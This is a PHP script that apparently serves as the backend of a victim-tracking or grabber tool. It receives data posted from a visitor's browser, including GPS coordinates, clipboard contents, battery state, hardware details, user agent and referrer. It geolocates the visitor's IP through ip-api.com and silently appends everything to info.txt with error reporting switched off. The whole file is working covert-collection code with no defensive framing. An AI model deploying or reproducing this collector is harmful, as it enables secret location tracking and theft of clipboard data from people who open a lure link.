<?php
error_reporting(0);

$networkinfo = $_POST['networkinformation'];
$batterypercentage = $_POST['batterypercentage'];
$ischarging = $_POST['ischarging'];
$width = $_POST['width'];
$height = $_POST['height'];
$platform = $_POST['platform'];
$gps = $_POST['gps'];
$localtime = $_POST['localtime'];
$devicelang = $_POST['devicelang'];
$iscookieEnabled = $_POST['iscookieEnabled'];
$useragent = $_POST['useragent'];
$deviceram = $_POST['deviceram'];
$cpuThreads = $_POST['cpuThreads'];
$referurl = $_POST['referurl'];
$clipboard = $_POST['clipboard'];

$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$ulke = $details->country;

date_default_timezone_set('Asia/Karachi');
$tarih = date("d-m-Y H:i:s");

$file = fopen('info.txt', 'a');
fwrite($file, "Ip Address: " . $ip . "\n" .
    "Country: " . $ulke . "\n" .
    "NetworkInformation: " . $networkinfo . "\n" .
    "BatteryPercentage: " . $batterypercentage . "\n" .
    "IsCharging: " . $ischarging . "\n" .
    "ScreenWidth: " . $width . "\n" .
    "ScreenHeight: " . $height . "\n" .
    "Platform: " . $platform . "\n" .
    "GPS: " . $gps . "\n" .
    "DeviceLocalTime: " . $localtime . "\n" .
    "DeviceLanguage: " . $devicelang . "\n" .
    "CookieEnabled: " . $iscookieEnabled . "\n" .
    "UserAgent: " . $useragent . "\n" .
    "DeviceMemory: " . $deviceram . "\n" .
    "CpuThreads: " . $cpuThreads . "\n" .
    "ReferUrl: " . $referurl . "\n" .
    "Clipboard: " . $clipboard . "\n\n");
fclose($file);
?>
